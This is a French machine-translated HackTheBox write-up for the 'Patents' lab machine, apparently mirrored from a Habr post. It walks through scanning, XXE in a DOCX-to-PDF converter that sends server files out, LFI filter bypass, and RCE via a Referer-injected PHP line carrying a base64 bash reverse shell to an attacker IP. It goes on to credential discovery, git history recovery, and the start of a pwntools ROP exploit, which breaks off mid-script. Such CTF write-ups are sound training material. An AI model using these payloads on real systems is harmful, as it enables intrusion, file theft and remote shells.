<!doctype html>
<html class="no-js" lang="fr">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-13"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-13');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üëäüèª üîπ ü§ñ HackTheBox. Adoption de brevets. XXE via des fichiers DOCX, LFI √† RCE, GIT et ROP üçï ü§º üëâüèø</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Je continue de publier des solutions envoy√©es pour un traitement ult√©rieur √† partir du site HackTheBox . 
 
 Dans cet article, nous exploitons XXE dan...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://geek-week.github.io/index.html"></a>
    <div class="page-header-text">Get best of the week</div>
  </header>
  <section class="page js-page"><h1>HackTheBox. Adoption de brevets. XXE via des fichiers DOCX, LFI √† RCE, GIT et ROP</h1><div class="post__body post__body_full">
      <div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/post/502268/"><div style="text-align:center;"><img src="https://habrastorage.org/webt/mc/3s/xg/mc3sxg5brnrlwn3qmajb37t8bhk.png" alt="image"></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Je continue de publier des solutions envoy√©es pour </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">un traitement ult√©rieur √†</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> partir du site </font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=" rel="nofollow"><font style="vertical-align: inherit;">HackTheBox</font></a><font style="vertical-align: inherit;"> . </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dans cet article, nous exploitons XXE dans le service de conversion de documents DOCX en PDF, obtenons RCE via LFI, creusons dans l'historique GIT et restaurons des fichiers, composons des cha√Ænes ROP √† l'aide de pwntools et trouvons un fichier racine cach√©. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
La connexion au laboratoire se fait via VPN. </font><font style="vertical-align: inherit;">Il est recommand√© de ne pas se connecter √† partir d'un ordinateur de travail ou d'un h√¥te o√π les donn√©es importantes pour vous sont disponibles, car vous vous retrouvez sur un r√©seau priv√© avec des personnes qui connaissent quelque chose dans le domaine de la s√©curit√© de l'information :)</font></font><br>
<br>
<div class="spoiler" role="button" tabindex="0">
                        <b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Information organisationnelle</font></font></b>
                        <div class="spoiler_text">      ,     ,   <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=" rel="nofollow">  Telegram</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=" rel="nofollow">    </a>   .    , ,    <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=" rel="nofollow">    </a>.<br>
<a name="habracut"></a><br>
      .          ,  -      ,      .<br>
</div>
                    </div><br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Recon</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Cette machine a une adresse IP 10.10.10.173, que j'ajoute √† / etc / hosts.</font></font><br>
<br>
<pre><code class="plaintext hljs">10.10.10.173    patents.htb</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Tout d'abord, nous analysons les ports ouverts. </font><font style="vertical-align: inherit;">Puisqu'il faut beaucoup de temps pour analyser tous les ports avec nmap, je vais d'abord le faire avec masscan. </font><font style="vertical-align: inherit;">Nous analysons tous les ports TCP et UDP √† partir de l'interface tun0 √† une vitesse de 500 paquets par seconde.</font></font><br>
<br>
<pre><code class="bash hljs">masscan -e tun0 -p1-65535,U:1-65535 10.10.10.173 --rate=500</code></pre><br>
<img src="https://habrastorage.org/webt/7v/ex/jr/7vexjrz3cmdge_csif-0ruxstxy.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Maintenant, pour des informations plus d√©taill√©es sur les services qui fonctionnent sur les ports, nous allons ex√©cuter une analyse avec l'option -A.</font></font><br>
<br>
<pre><code class="bash hljs">nmap -A patents.htb -p22,80,8888</code></pre><br>
<img src="https://habrastorage.org/webt/nk/d8/jm/nkd8jml8rg_aau8otsuwznq-ab0.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
L'h√¥te ex√©cute les services SSH et le serveur Web Apache, le port 8888 √©tant r√©serv√© √† un service incompr√©hensible. </font><font style="vertical-align: inherit;">Voyons le Web. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/q4/ba/lv/q4balvxmcp7ac3m0qqge2qtwhcm.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Le site dispose d'un formulaire de t√©l√©chargement des documents DOCX.</font></font><br>
<br>
<img src="https://habrastorage.org/webt/m4/xk/if/m4xkiftz0h6oxfikutspnmyijdy.png" alt="image"><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">XXE DOCX</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Selon la d√©claration, notre document sera converti au format PDF. Cela sugg√®re la pens√©e de XXE. J'ai pris un exemple </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">d'ici</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . </font></font><br>
<br>
<img src="https://habrastorage.org/webt/eg/mo/fo/egmofoq1l5r8ohdmorvwf83gsfe.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ainsi, dans cet exemple, l'h√¥te tentera de t√©l√©charger le document xml depuis le serveur distant. En t√©l√©chargeant ce document, il lira le fichier local sp√©cifi√© dans le document xml t√©l√©charg√©, le codera en base64 et contactera √† nouveau notre serveur, transmettant le fichier encod√© comme param√®tre de requ√™te. Autrement dit, apr√®s avoir d√©cod√© ce param√®tre, nous obtenons le fichier de la machine distante. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Mais cette charge ne doit pas √™tre plac√©e sur le chemin d'acc√®s word / document.xml. √âtant donn√© que le SDK OpenXML est utilis√© pour travailler avec ce type de document, il suit </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">d'ici</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> et </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">d'ici</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">, le logiciel c√¥t√© serveur recherchera les donn√©es dans word / document.xml et dans customXML / item1.xml. Par cons√©quent, la charge doit y √™tre plac√©e. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Cr√©ons un document docx et d√©compressez-le en tant qu'archive zip. Apr√®s cela, cr√©ez le r√©pertoire customXML et cr√©ez-y le fichier item1.xml. Dans ce document, nous allons √©crire le code de l'image ci-dessus, en changeant l'adresse IP pour la n√¥tre. Et nous archivons le document. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/s0/j_/gw/s0j_gwgd0ehur9mboxtcwz8eudg.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ex√©cutez maintenant le serveur Web local.</font></font><br>
<br>
<pre><code class="bash hljs">python3 -m http.server 80</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Et dans le r√©pertoire courant, nous cr√©ons le deuxi√®me fichier xml, en sp√©cifiant / etc / passwd comme fichier souhait√©. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/6y/5s/l7/6y5sl7j1lcilayxrtbebn9z78tw.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Et t√©l√©chargez le document sur le serveur. Dans la fen√™tre avec le serveur Web en cours d'ex√©cution, nous verrons la connexion inverse. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/fj/za/to/fjzatoxzmrvwpkccdyekqyig_ju.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
D√©codez base64 et obtenez le fichier demand√©. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/ef/wy/ty/efwytya0_ldxuvv1qd9qjphrib0.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
De cette fa√ßon, nous pouvons lire des fichiers sur le serveur. Lisons les fichiers de configuration d'Apache. Pour ce faire, modifiez dtd.xml et r√©p√©tez le t√©l√©chargement du document. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/um/0q/xq/um0qxqy-zxbvhbbe-dgz2_05msy.png" alt="image"><br>
<br>
<img src="https://habrastorage.org/webt/-x/nf/zh/-xnfzhmk9bbhd8fjx5eko5vbaeg.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
On retrouve donc le r√©pertoire dans lequel se trouve le site. Essayons de lire le fichier de configuration. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/_b/dd/-v/_bdd-vrylmvfa98iklgx3lnykzi.png" alt="image"><br>
<br>
<img src="https://habrastorage.org/webt/pq/5l/ht/pq5lhtyyzajjcijlbaa0hubw5j4.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Et le commentaire dit que le fichier a √©t√© renomm√© en raison d'une vuln√©rabilit√©. Nous y ferons bien s√ªr r√©f√©rence </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">patents.htb / getPatent_alphav1.0.php</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> .</font></font><br>
<br>
<img src="https://habrastorage.org/webt/hq/wd/hj/hqwdhjf6zhjdaehc2zn6ic5p3hu.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
En se tournant vers cette page et en passant le chemin ../../../../../etc/passwd comme param√®tre id, toutes les occurrences de ¬´../¬ª seront supprim√©es de notre ligne. </font><font style="vertical-align: inherit;">Rempla√ßons chaque ligne ¬´../¬ª par ¬´... /. /¬ª, Donc si vous supprimez une s√©quence, elle restera toujours ¬´../¬ª. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/fr/a3/pu/fra3pugykwho9xrl9xcklono1zg.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Et nous trouvons LFI.</font></font><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Point d'acc√®s</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Essayons d'obtenir RCE √† partir de cela. </font><font style="vertical-align: inherit;">Franchement - c'√©tait difficile. </font><font style="vertical-align: inherit;">Le fait est que lors de l'envoi d'un tel document, nous n'avons pas re√ßu d'offre de t√©l√©chargement de PDF. </font><font style="vertical-align: inherit;">C'est-√†-dire que le descripteur 2 a √©t√© utilis√© (pour afficher les messages de diagnostic et de d√©bogage sous forme de texte). </font><font style="vertical-align: inherit;">Et nous pouvons nous tourner vers lui. </font><font style="vertical-align: inherit;">Encodons le shell invers√© en base64:</font></font><br>
<br>
<pre><code class="bash hljs">/bin/bash -c <span class="hljs-string">'/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.211/4321 0&gt;&amp;1;'</span></code></pre><pre><code class="bash hljs">L2Jpbi9iYXNoIC1jICcvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMjExLzQzMjEgMD4mMTsn</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Nous allons le d√©coder et le passer √† la fonction syst√®me en php. </font><font style="vertical-align: inherit;">Passons le code en tant qu'en-t√™te HTTP lors du t√©l√©chargement d'un fichier.</font></font><br>
<br>
<pre><code class="bash hljs">curl http://patents.htb/convert.php -F <span class="hljs-string">"userfile=@file.docx"</span> -F <span class="hljs-string">'submit=Generate PDF'</span> --referer <span class="hljs-string">'http://test.com/&lt;?php system(base64_decode("L2Jpbi9iYXNoIC1jICcvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMjExLzQzMjEgMD4mMTsn")); ?&gt;'</span></code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ex√©cutez netcat.</font></font><br>
<br>
<pre><code class="bash hljs">nc -lvp 4321</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Et maintenant, passons au deuxi√®me descripteur.</font></font><br>
<br>
<pre><code class="bash hljs">curl http://patents.htb/getPatent_alphav1.0.php?id=....//....//....//....//....//....//....//proc//self//fd//2</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Nous reprenons contact. </font></font><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ROOT 1</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Chargez le syst√®me de script transf√®re les </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">linpeas</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> et analysez soigneusement la sortie. </font><font style="vertical-align: inherit;">Nous travaillons donc dans un conteneur docker. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/sa/hf/xz/sahfxzrubyathg6rglkqhwf0cvo.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
On trouve √©galement des hachages. </font><font style="vertical-align: inherit;">Mais le piratage, on arrive √† rien. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/bf/cc/dy/bfccdyitk-1ksi7qmg5omq_lesw.png" alt="image"><br>
<br>
<img src="https://habrastorage.org/webt/dv/ss/up/dvssupnunggkpzz64gsfdxjveuw.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Par cons√©quent, ex√©cutez </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">pspy64</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> pour suivre les processus en cours d'ex√©cution. </font><font style="vertical-align: inherit;">Et nous trouvons le d√©but du processus en tant que root, dans lequel le mot de passe est pass√© en tant que variable d'environnement. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/wi/2_/yz/wi2_yzfeqgi3eehjxylmqf7k8vm.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Et changez localement l'utilisateur en entrant ce mot de passe.</font></font><br>
<br>
<img src="https://habrastorage.org/webt/iu/bi/yu/iubiyu543de3olgssz1ry-djuf4.png" alt="image"><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ROOT 2</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Voyons ce que fait ce script. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/ck/vk/h-/ckvkh-wezr0ofumiqzzqakn5wog.png" alt="image"><br>
<br>
<img src="https://habrastorage.org/webt/rg/tf/rs/rgtfrsor5irhivfoifw-jr6c008.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Nous obtenons une astuce sur certains lfmserver et enregistrons √©galement le nom d'utilisateur et le mot de passe. </font><font style="vertical-align: inherit;">Regardons dans le syst√®me tout ce qui concerne lfm. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/af/hz/ea/afhzea8jusqqac6irjgch6kyvjy.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Et nous trouvons le d√©p√¥t git dans ce r√©pertoire. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/ln/h4/op/lnh4opchyrjvoc88mmg8kiwe7_y.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Travaillons avec ce r√©f√©rentiel. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/gq/by/ge/gqbygeqd2j4xoshvorswvluxkno.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Voyons l'histoire des changements. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/t7/ro/rj/t7rorjk0v42cfsjtphjd9uc1fs0.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Voyons l'histoire des changements. </font><font style="vertical-align: inherit;">Nous voyons donc que dans l'avant-dernier commit, un fichier ex√©cutable et une description ont √©t√© ajout√©s, et dans le dernier, ils ont d√©j√† √©t√© supprim√©s. </font><font style="vertical-align: inherit;">Revenons en arri√®re avant de supprimer des fichiers.</font></font><br>
<br>
<pre><code class="bash hljs">git revert 7c6609240f414a2cb8af00f75fdc7cfbf04755f5</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Et dans notre r√©pertoire un fichier ex√©cutable et une description sont apparus. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/ga/wc/4s/gawc4s_vovqdv6zz91jdrdbicfk.png" alt="image"><br>
<br>
<img src="https://habrastorage.org/webt/y5/ns/gi/y5nsgibu66e8a0_g_34mde9b2ao.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ici, je voulais d√©j√† commencer √† inverser le fichier, mais - nous avons un projet git! </font><font style="vertical-align: inherit;">J'ai trouv√© un commit qui mentionnait les codes sources. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/7m/xr/ki/7mxrkibt8ixidkd4tir6ksasywk.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Et restaurons les fichiers.</font></font><br>
<br>
<pre><code class="bash hljs">git checkout 0ac7c940010ebb22f7fbedb67ecdf67540728123</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Apr√®s cela, nous t√©l√©chargeons les codes sources d'int√©r√™t, le programme lui-m√™me et les biblioth√®ques sur la machine locale. </font></font><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Rop</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Nous devons essayer de trouver et d'exploiter la vuln√©rabilit√© dans le programme, il existe des codes sources pour vous aider. </font><font style="vertical-align: inherit;">V√©rifions la protection dans un fichier binaire. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/pq/fj/bd/pqfjbdyozi1qaxhxeauf1_hfcca.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Autrement dit, le canari et PIE sont manquants, mais la pile n'est pas ex√©cutable. </font><font style="vertical-align: inherit;">Ouvrez le fichier binaire dans n'importe quel d√©sassembleur avec un d√©compilateur qui vous convient (j'utilise IDA Pro 7.2) et comparez le code d√©compil√© avec les codes source du r√©f√©rentiel. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/tz/rc/ue/tzrcued2khgzxq9jmhziq7vsfl4.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Pour vous connecter au serveur et utiliser les donn√©es du fichier checker.py, ainsi que les informations d'identification. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/xh/7b/aa/xh7baayunbtjue28qyfleddzqxc.png" alt="image"><br>
<br>
<img src="https://habrastorage.org/webt/-r/rp/mo/-rrpmoh0l0-hginwoubihqb3a_g.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
√âcrivons un mod√®le d'exploit.</font></font><br>
<br>
<pre><code class="python hljs"><span class="hljs-comment">#!/usr/bin/python3</span><font></font>
<font></font>
<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<font></font>
<font></font>
context(os=<span class="hljs-string">"linux"</span>, arch=<span class="hljs-string">"amd64"</span>)<font></font>
HOST = <span class="hljs-string">"127.0.0.1"</span>
PORT = <span class="hljs-number">8888</span>
username = <span class="hljs-string">"lfmserver_user"</span>
password = <span class="hljs-string">"!gby0l0r0ck$$!"</span></code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
D√©terminons maintenant la demande. </font><font style="vertical-align: inherit;">Lancez l'application. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/wx/xj/iu/wxxjiuq1vfqmwzgrshyjzlmzzou.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Vous devez envoyer le chemin d'acc√®s au fichier et le hachage de son contenu. </font><font style="vertical-align: inherit;">Par exemple, j'ai pris / etc / hosts. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/p0/3k/ek/p03kekiuesrd9mc2at4t_swcce0.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ajoutez le code suivant au mod√®le.</font></font><br>
<br>
<pre><code class="python hljs">INPUTREQ = <span class="hljs-string">"CHECK /{} LFM\r\nUser={}\r\nPassword={}\r\n\r\n{}\n"</span>
file = <span class="hljs-string">"/etc/hosts"</span>
md5sum = <span class="hljs-string">"7d8fc74dc6cc8517a81a5b00b8b9ec32"</span><font></font>
send_ = INPUTREQ.format(file,username, password, md5sum)<font></font>
<font></font>
r = remote(HOST, PORT)<font></font>
r.sendline(send_.encode())<font></font>
<font></font>
r.interactive()</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Maintenant, ex√©cutez et obtenez l'erreur 404. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/ej/nd/b6/ejndb6z2tpkgvajgiq3akvwsbjg.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Voyons le fichier journal. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/qy/d6/gf/qyd6gftg9f6m3ce87f9acdpsodc.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Il est clair o√π l'application recherche un fichier. Jouons avec les chemins et sp√©cifions un tel fichier.</font></font><br>
<br>
<pre><code class="python hljs">file = <span class="hljs-string">"../../../../../etc/hosts"</span></code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Nous ex√©cuterons le code et nous ne verrons aucune erreur. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/px/sp/o-/pxspo-1bkqx14dpydxmj11odvyo.png" alt="image"><br>
<br>
<img src="https://habrastorage.org/webt/id/8x/7z/id8x7zspwbcbv1u9qmx-ccjhiis.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Mais dans le cas de l'urlencode, nous obtenons une r√©ponse avec le code 200 du serveur!</font></font><br>
<br>
<pre><code class="python hljs">file = <span class="hljs-string">"%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fhosts"</span></code></pre><br>
<img src="https://habrastorage.org/webt/uh/pt/s6/uhpts6ydsvnhutaadndkfzt_ejy.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
G√©nial, revenons au d√©monteur. On trouve parmi les lignes (Shift + F12) une r√©ponse serveur r√©ussie. Et voyons o√π il est accessible (X). </font></font><br>
<br>
<img src="https://habrastorage.org/webt/ck/ef/so/ckefsoopnkpezgsq6cdlguv7jh8.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Et nous passons √† la premi√®re fonction, o√π au tout d√©but il y a une v√©rification des pouvoirs. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/8v/6y/jg/8v6yjgpj94ih9fln0dmhbl3_zas.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Renommons les lignes variables dans la fen√™tre du d√©sassembleur pour le rendre plus facile √† comprendre dans le d√©compilateur. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/dz/ut/vx/dzutvxrxvyv4tdq_zgldkiv9xqw.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Et en analysant le code des lignes 18-24, en comprenant ce qui suit: une partie de l'entr√©e utilisateur tombe dans la fonction sub_402DB9, o√π la cha√Æne est convertie en nom de variable, qui tombe ensuite dans la fonction d'acc√®s, et si le r√©sultat est n√©gatif, le message 404 est √©mis. Ainsi, le nom de la variable sera le chemin d'acc√®s au fichier. √âtant donn√© que la demande a √©t√© trait√©e m√™me dans le codage urlencode, cette fonction est tr√®s probablement n√©cessaire pour le d√©codage.</font></font><br>
<br>
<img src="https://habrastorage.org/webt/mo/eb/wj/moebwjpolutcowo7qxeyi15dj-k.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Mais le fait est que le nom de la variable, o√π les donn√©es sont transf√©r√©es, est d'une taille limit√©e. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/u_/jz/ht/u_jzhtdqgp1vgp3qyuguunuxl_i.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ainsi, pour un d√©passement de tampon, nous devons transf√©rer 0xA0 = 160 octets. Ajoutons dans le code la fonction d'ajouter jusqu'√† 160 octets et d'encoder le chemin d'acc√®s au fichier. √âtant donn√© que le hachage est calcul√© √† partir du contenu du fichier, il est n√©cessaire de ne pas violer l'int√©grit√© du chemin du fichier, c'est-√†-dire qu'apr√®s le chemin principal, ajoutez 0x00 octets. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Mais le fait est que nous devons conna√Ætre le hachage √† partir de n'importe quel fichier sur le serveur, qui sera toujours disponible et ne changera jamais. Par exemple / proc / sys / kernel / randomize_va_space, et comme nous nous souvenons de la sortie de linPEAS, ASLR est activ√©, c'est-√†-dire que nous connaissons le hachage. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/tz/dk/j_/tzdkj_hdn9owhtmod5ekklqior4.png" alt="image"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Modifiez ensuite le code.</font></font><br>
<br>
<pre><code class="python hljs"><span class="hljs-comment">#!/usr/bin/python3</span>
<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<font></font>
<font></font>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">append_and_encode</span>(<span class="hljs-params">file, rop=<span class="hljs-string">b""</span></span>):</span>
    ret = <span class="hljs-string">b""</span>
    path = (file + <span class="hljs-string">b"\x00"</span>).ljust(<span class="hljs-number">160</span>, <span class="hljs-string">b"A"</span>) + rop
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> path:<font></font>
        ret += <span class="hljs-string">b"%"</span> + hex(i)[<span class="hljs-number">2</span>:].rjust(<span class="hljs-number">2</span>,<span class="hljs-string">"0"</span>).encode()
    <span class="hljs-keyword">return</span> ret<font></font>
<font></font>
context(os=<span class="hljs-string">"linux"</span>, arch=<span class="hljs-string">"amd64"</span>, log_level=<span class="hljs-string">"error"</span>)<font></font>
<font></font>
HOST = <span class="hljs-string">"127.0.0.1"</span>
PORT = <span class="hljs-number">8888</span>
